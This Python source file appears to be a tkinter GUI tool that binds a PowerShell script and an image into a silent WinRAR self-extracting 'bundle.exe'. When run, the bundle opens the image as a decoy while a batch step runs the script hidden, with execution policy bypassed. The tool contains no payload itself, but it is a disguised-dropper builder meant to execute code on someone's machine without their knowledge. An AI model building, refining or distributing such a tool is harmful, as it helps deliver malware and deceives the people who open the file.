import os
import sys
import subprocess
import tempfile
import shutil
from pathlib import Path
import tkinter as tk
from tkinter import filedialog, messagebox, ttk


class ImageExeBundler:
    def __init__(self, root):
        self.root = root
        self.root.title("Image + EXE Bundler")
        self.root.geometry("700x500")
        self.root.resizable(False, False)
        
        self.ps1_file = None
        self.image_file = None
        
    # Get the folder where the EXE is located (not the PyInstaller temp folder)
        if getattr(sys, 'frozen', False):
            # Jeśli uruchomiony jako EXE
            self.script_dir = os.path.dirname(sys.executable)
        else:
            # Jeśli uruchomiony jako skrypt Python
            self.script_dir = os.path.dirname(os.path.abspath(__file__))
        
    # Automatically scan folder
        self.scan_folder()
        
        self.setup_ui()
        
    def scan_folder(self):
        """Scans the script folder and automatically selects files"""
        # Find PS1 files
        ps1_files = [f for f in os.listdir(self.script_dir) 
                     if f.endswith('.ps1') and os.path.isfile(os.path.join(self.script_dir, f))]
        # Find images
        image_extensions = ('.jpg', '.jpeg', '.png', '.bmp', '.gif')
        image_files = [f for f in os.listdir(self.script_dir) 
                      if f.lower().endswith(image_extensions) and os.path.isfile(os.path.join(self.script_dir, f))]
        # If there is only one PS1 file, select it automatically
        if len(ps1_files) == 1:
            self.ps1_file = os.path.join(self.script_dir, ps1_files[0])
        elif len(ps1_files) > 1:
            self.ps1_files_list = ps1_files
        else:
            self.ps1_files_list = []
        # If there is only one image, select it automatically
        if len(image_files) == 1:
            self.image_file = os.path.join(self.script_dir, image_files[0])
        elif len(image_files) > 1:
            self.image_files_list = image_files
        else:
            self.image_files_list = []
        
    def setup_ui(self):
        # Main frame
        main_frame = ttk.Frame(self.root, padding="20")
        main_frame.grid(row=0, column=0, sticky="nsew")
        # Title
        title_label = ttk.Label(main_frame, text="PS1 → EXE + Image SFX Creator", 
                                font=('Arial', 16, 'bold'))
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 20))
        # Scan status
        scan_info = ttk.Label(main_frame, text=f"Folder: {os.path.basename(self.script_dir)}", 
                             foreground="gray", font=('Arial', 9))
        scan_info.grid(row=1, column=0, columnspan=3, pady=(0, 10))
        # PS1 file selection
        ttk.Label(main_frame, text="PowerShell file (.ps1):").grid(row=2, column=0, 
                                                                     sticky=tk.W, pady=5)
        # If there are multiple PS1 files, show list
        if hasattr(self, 'ps1_files_list') and len(self.ps1_files_list) > 1:
            self.ps1_combo = ttk.Combobox(main_frame, values=self.ps1_files_list, 
                                         state='readonly', width=40)
            self.ps1_combo.grid(row=2, column=1, sticky=tk.W, padx=10, pady=5)
            self.ps1_combo.bind('<<ComboboxSelected>>', self.on_ps1_selected)
            self.ps1_label = ttk.Label(main_frame, text="Select from list", foreground="orange")
        elif self.ps1_file:
            self.ps1_label = ttk.Label(main_frame, text=os.path.basename(self.ps1_file), 
                                      foreground="green")
            self.ps1_combo = None
        else:
            self.ps1_label = ttk.Label(main_frame, text="No .ps1 files found", 
                                      foreground="red")
            self.ps1_combo = None
        if not hasattr(self, 'ps1_combo') or self.ps1_combo is None:
            self.ps1_label.grid(row=2, column=1, sticky=tk.W, padx=10, pady=5)
        else:
            self.ps1_label.grid(row=3, column=1, sticky=tk.W, padx=10, pady=5)
        ttk.Button(main_frame, text="Browse", 
                   command=self.select_ps1).grid(row=2, column=2, pady=5)
        # Image selection
        ttk.Label(main_frame, text="Image (JPG/PNG/BMP):").grid(row=4, column=0, 
                                                                  sticky=tk.W, pady=5)
        # If there are multiple images, show list
        if hasattr(self, 'image_files_list') and len(self.image_files_list) > 1:
            self.image_combo = ttk.Combobox(main_frame, values=self.image_files_list, 
                                           state='readonly', width=40)
            self.image_combo.grid(row=4, column=1, sticky=tk.W, padx=10, pady=5)
            self.image_combo.bind('<<ComboboxSelected>>', self.on_image_selected)
            self.image_label = ttk.Label(main_frame, text="Select from list", foreground="orange")
        elif self.image_file:
            self.image_label = ttk.Label(main_frame, text=os.path.basename(self.image_file), 
                                        foreground="green")
            self.image_combo = None
        else:
            self.image_label = ttk.Label(main_frame, text="No images found", 
                                        foreground="red")
            self.image_combo = None
        if not hasattr(self, 'image_combo') or self.image_combo is None:
            self.image_label.grid(row=4, column=1, sticky=tk.W, padx=10, pady=5)
        else:
            self.image_label.grid(row=5, column=1, sticky=tk.W, padx=10, pady=5)
        ttk.Button(main_frame, text="Browse", 
                   command=self.select_image).grid(row=4, column=2, pady=5)
        # Separator
        ttk.Separator(main_frame, orient='horizontal').grid(row=6, column=0, 
                                                            columnspan=3, 
                                                            sticky="we", 
                                                            pady=20)
        # Create button
        self.create_button = ttk.Button(main_frame, text="Create SFX Bundle", 
                                        command=self.create_bundle)
        self.create_button.grid(row=7, column=0, columnspan=3, pady=10)
        # Progress bar
        self.progress = ttk.Progressbar(main_frame, length=400, mode='indeterminate')
        self.progress.grid(row=8, column=0, columnspan=3, pady=10)
        # Status
        self.status_label = ttk.Label(main_frame, text="", foreground="blue")
        self.status_label.grid(row=9, column=0, columnspan=3, pady=5)
        # Check if ready
        self.check_ready()
        
    def on_ps1_selected(self, event):
        """When user selects a PS1 file from the list"""
        if self.ps1_combo is not None:
            selected = self.ps1_combo.get()
            self.ps1_file = os.path.join(self.script_dir, selected)
            self.ps1_label.config(text=f"✓ {selected}", foreground="green")
            self.check_ready()
        
    def on_image_selected(self, event):
        """When user selects an image from the list"""
        if self.image_combo is not None:
            selected = self.image_combo.get()
            self.image_file = os.path.join(self.script_dir, selected)
            self.image_label.config(text=f"✓ {selected}", foreground="green")
            self.check_ready()
        
    def select_ps1(self):
        filename = filedialog.askopenfilename(
            title="Select PowerShell file",
            filetypes=[("PowerShell Scripts", "*.ps1"), ("All Files", "*.*")]
        )
        if filename:
            self.ps1_file = filename
            self.ps1_label.config(text=os.path.basename(filename), foreground="black")
            self.check_ready()
            
    def select_image(self):
        filename = filedialog.askopenfilename(
            title="Select image",
            filetypes=[("Image Files", "*.jpg *.jpeg *.png *.bmp *.gif"), 
                      ("All Files", "*.*")]
        )
        if filename:
            self.image_file = filename
            self.image_label.config(text=os.path.basename(filename), foreground="black")
            self.check_ready()
            
    def check_ready(self):
        if self.ps1_file and self.image_file:
            self.create_button.config(state='normal')
        else:
            self.create_button.config(state='disabled')
            
    def update_status(self, message):
        self.status_label.config(text=message)
        self.root.update()
            
    def create_sfx_archive(self, image_path, ps1_path, output_path):
        """Creates SFX archive using WinRAR - simple and effective"""
        self.update_status("Creating SFX archive...")
        # Check if WinRAR is installed
        winrar_paths = [
            r"C:\Program Files\WinRAR\WinRAR.exe",
            r"C:\Program Files (x86)\WinRAR\WinRAR.exe",
        ]
        winrar = None
        for path in winrar_paths:
            if os.path.exists(path):
                winrar = path
                break
        if not winrar:
            raise Exception("WinRAR is not installed. Download from https://www.win-rar.com/")
        # Temporary directory for config
        temp_dir = tempfile.mkdtemp()
        try:
            # Create batch script to run
            batch_file = os.path.join(temp_dir, "run.bat")
            image_name = os.path.basename(image_path)
            ps1_name = os.path.basename(ps1_path)
            # Simple batch script
            with open(batch_file, 'w') as f:
                f.write('@echo off\n')
                f.write(f'start "" "{image_name}"\n')
                f.write(f'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "{ps1_name}"\n')
                f.write('exit\n')
            # Create SFX config script - extract to current folder
            sfx_config = os.path.join(temp_dir, "config.txt")
            with open(sfx_config, 'w') as f:
                f.write('Setup=run.bat\n')
                f.write('Silent=1\n')
                f.write('Overwrite=1\n')
            # Create RAR archive with SFX
            subprocess.run([
                winrar, 'a', '-sfx', '-ep1', 
                f'-z{sfx_config}',
                output_path,
                image_path, ps1_path, batch_file
            ], check=True, capture_output=True)
            if not os.path.exists(output_path):
                raise Exception("Failed to create SFX archive")
            return output_path
        finally:
            # Cleanup only temp_dir
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
                
    def create_bundle(self):
        self.progress.start()
        self.create_button.config(state='disabled')
        try:
            # Remove old bundle.exe if exists
            bundle_path = os.path.join(self.script_dir, "bundle.exe")
            if os.path.exists(bundle_path):
                try:
                    os.remove(bundle_path)
                except:
                    messagebox.showwarning("Warning", 
                        "Cannot remove old bundle.exe. Close the file if it is open.")
                    self.progress.stop()
                    self.create_button.config(state='normal')
                    return
            # Remove old script.exe if exists
            script_exe = os.path.join(self.script_dir, "script.exe")
            if os.path.exists(script_exe):
                try:
                    os.remove(script_exe)
                except:
                    pass
            # Remove output folder if exists (try, but don't block if fails)
            output_folder = os.path.join(self.script_dir, "output")
            if os.path.exists(output_folder):
                try:
                    shutil.rmtree(output_folder)
                except:
                    pass  # Ignore error - folder may be open
            # Create SFX archive directly from PS1 and image
            self.update_status("Creating bundle.exe...")
            sfx_path = self.create_sfx_archive(self.image_file, self.ps1_file, bundle_path)
            self.progress.stop()
            self.update_status("Done!")
            messagebox.showinfo(
                "Success!",
                f"Bundle has been created:\n{os.path.basename(sfx_path)}\n\n"
                f"Run the file to open the image and execute the script."
            )
            # Open folder
            os.startfile(self.script_dir)
        except Exception as e:
            self.progress.stop()
            self.update_status("Error!")
            messagebox.showerror("Error", str(e))
        finally:
            self.progress.stop()
            self.create_button.config(state='normal')


def main():
    root = tk.Tk()
    app = ImageExeBundler(root)
    root.mainloop()


if __name__ == "__main__":
    main()
